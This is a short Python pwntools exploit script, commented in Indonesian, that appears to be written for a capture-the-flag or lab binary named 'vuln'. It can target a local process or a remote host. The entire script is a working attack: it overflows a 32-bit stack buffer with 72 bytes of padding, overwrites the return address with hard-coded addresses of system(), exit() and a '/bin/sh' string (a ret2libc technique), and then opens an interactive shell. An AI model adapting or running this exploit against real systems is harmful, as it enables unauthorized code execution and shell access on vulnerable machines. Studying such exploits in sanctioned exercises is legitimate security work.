from pwn import *

# === CONFIGURATION ===
mode = 'local' # Ganti ke 'remote' untuk NC ke server

if mode == 'local':
    p = process('./vuln')
    # Jika ASLR lokal nyala, alamat ini mungkin berubah tiap run.
    # Gunakan alamat dari hasil 'vmmap' atau leak jika ada.
else:
    p = remote('10.10.10.10', 1337)

# --- LANGKAH 1: Definisikan Alamat (Berdasarkan Gambar) ---
# Alamat ini didapat dari GDB atau info dari soal
addr_system = 0xb7e52070
addr_exit   = 0xb7e45f10
addr_binsh  = 0xb7f6d4af

log.info(f"Target system()  : {hex(addr_system)}")
log.info(f"Target /bin/sh   : {hex(addr_binsh)}")

# --- LANGKAH 2: Susun Payload ret2libc ---
# Struktur 32-bit: [Padding] + [Fungsi] + [Return setelah fungsi] + [Argumen 1]
padding = b'A' * 72

payload = padding
payload += p32(addr_system) # Overwrite Return Address ke system()
payload += p32(addr_exit)   # Return address setelah system() selesai (supaya clean exit)
payload += p32(addr_binsh)  # Argumen pertama untuk system()

# --- LANGKAH 3: Kirim dan Eksekusi ---
log.info("Mengirim payload ret2libc...")
p.sendline(payload)

# Masuk ke mode interaktif untuk menggunakan shell /bin/sh
p.interactive()